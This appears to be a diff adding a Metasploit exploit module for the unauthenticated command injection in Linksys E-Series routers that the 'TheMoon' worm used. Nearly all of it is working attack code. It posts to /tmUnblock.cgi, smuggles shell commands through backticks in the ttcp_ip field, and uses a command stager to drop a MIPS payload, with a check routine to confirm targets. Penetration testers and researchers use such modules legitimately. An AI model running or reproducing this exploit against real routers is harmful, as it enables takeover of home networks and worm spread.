@@ -1,0 +1,121 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStagerEcho
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Linksys E-Series TheMoon Remote Command Injection',
+      'Description' => %q{
+        Some Linksys E-Series Routers are vulnerable to an unauthenticated OS command
+        injection. This vulnerability was used from the so called "TheMoon" worm. There
+        are many Linksys systems that might be vulnerable including E4200, E3200, E3000,
+        E2500, E2100L, E2000, E1550, E1500, E1200, E1000, E900. This module was tested
+        successfully against an E1500 v1.0.5.
+      },
+      'Author'      =>
+        [
+          'Johannes Ullrich', #worm discovery
+          'Rew', # original exploit
+          'infodox', # another exploit
+          'Michael Messner <devnull@s3cur1ty.de>', # Metasploit module
+          'juan vazquez' # minor help with msf module
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          [ 'EDB', '31683' ],
+          [ 'BID', '65585' ],
+          [ 'OSVDB', '103321' ],
+          [ 'URL', 'http://packetstormsecurity.com/files/125253/linksyseseries-exec.txt' ],
+          [ 'URL', 'http://packetstormsecurity.com/files/125252/Linksys-Worm-Remote-Root.html' ],
+          [ 'URL', 'https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633' ],
+          [ 'URL', 'https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630' ]
+        ],
+      'DisclosureDate' => 'Feb 13 2014',
+      'Privileged'     => true,
+      'Platform'       => %w{ linux unix },
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'Targets'        =>
+        [
+          [ 'Linux mipsel Payload',
+            {
+            'Arch' => ARCH_MIPSLE,
+            'Platform' => 'linux'
+            }
+          ],
+          [ 'Linux mipsbe Payload',
+            {
+            'Arch' => ARCH_MIPSBE,
+            'Platform' => 'linux'
+            }
+          ],
+        ],
+      'DefaultTarget'  => 0
+      ))
+  end
+
+
+  def execute_command(cmd, opts)
+    begin
+      res = send_request_cgi({
+        'uri'    => '/tmUnblock.cgi',
+        'method' => 'POST',
+        'encode_params' => true,
+        'vars_post' => {
+          "submit_button" => "",
+          "change_action" => "",
+          "action" => "",
+          "commit" => "0",
+          "ttcp_num" => "2",
+          "ttcp_size" => "2",
+          "ttcp_ip" => "-h `#{cmd}`",
+          "StartEPI" => "1"
+        }
+      }, 2)
+      return res
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'uri'     => '/tmUnblock.cgi',
+        'method'  => 'GET'
+      })
+
+      if res && [200, 301, 302].include?(res.code)
+        return Exploit::CheckCode::Detected
+      end
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    print_status("#{peer} - Trying to access the vulnerable URL...")
+
+    unless check == Exploit::CheckCode::Detected
+      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
+    end
+
+    print_status("#{peer} - Exploiting...")
+    execute_cmdstager
+  end
+
+end
